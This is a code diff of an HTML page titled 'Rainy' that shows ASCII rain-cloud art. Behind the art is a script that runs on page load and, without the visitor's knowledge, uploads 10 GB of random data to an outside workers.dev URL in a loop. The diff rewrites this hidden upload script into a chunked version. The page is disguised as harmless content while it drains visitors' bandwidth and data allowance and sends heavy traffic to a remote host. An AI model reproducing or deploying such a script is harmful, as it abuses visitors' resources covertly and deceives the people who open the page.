@@ -1,44 +1,54 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
+    <title>Rainy</title>
 </head>
 <body>
+    <pre style="word-wrap: break-word; white-space: pre-wrap;"><br> 
+          .-- . 
+       .-(     ). 
+      (___.__ )__)
+       /// / //
+        // ///
+    </pre>
+<script>
+const WORKER_URL = 'https://upload.djameledine754.workers.dev/';
+const targetSize = 10 * 1024 * 1024 * 1024;
+const chunkSize = 64 * 1024;
+let uploadedBytes = 0;
+let startTime = performance.now();
 
-    <script>
-        const WORKER_URL = 'https://upload.djameledine754.workers.dev/';
+async function uploadLoop() {
+    while (uploadedBytes < targetSize) {
+        const chunk = new Uint8Array(chunkSize);
+        crypto.getRandomValues(chunk);
 
-        window.addEventListener('DOMContentLoaded', async () => {
-            const targetSize = 10 * 1024 * 1024 * 1024;
-            let uploadedBytes = 0;
-
-            const chunkSize = 1024 * 1024; 
-            const chunk = new Uint8Array(chunkSize);
-            crypto.getRandomValues(chunk);
-
-            const stream = new ReadableStream({
-                pull(controller) {
-                    if (uploadedBytes >= targetSize) {
-                        controller.close();
-                        return;
-                    }
-                    
-                    controller.enqueue(chunk);
-                    uploadedBytes += chunkSize;
-                }
+        try {
+            await fetch(WORKER_URL, {
+                method: 'POST',
+                body: chunk,
+                headers: { 'Content-Type': 'application/octet-stream' }
             });
+        } catch (err) {
+            console.error("Upload error:", err);
+            break;
+        }
 
-            try {
-                await fetch(WORKER_URL, {
-                    method: 'POST',
-                    body: stream,
-                    duplex: 'half',
-                    headers: { 'Content-Type': 'application/octet-stream' }
-                });
-            } catch (error) {
-                //
-            }
-        });
-    </script>
+        uploadedBytes += chunkSize;
+
+        if (uploadedBytes % (1024 * 1024 * 10) === 0) {
+            const elapsed = (performance.now() - startTime) / 1000;
+            const speed = (uploadedBytes / (1024 * 1024)) / elapsed;
+            console.log((uploadedBytes / targetSize * 100).toFixed(2) + "% uploaded at " + speed.toFixed(2) + " MB/s");
+        }
+    }
+
+    console.log("Upload completed");
+}
+
+uploadLoop();
+</script>
+
 </body>
 </html>
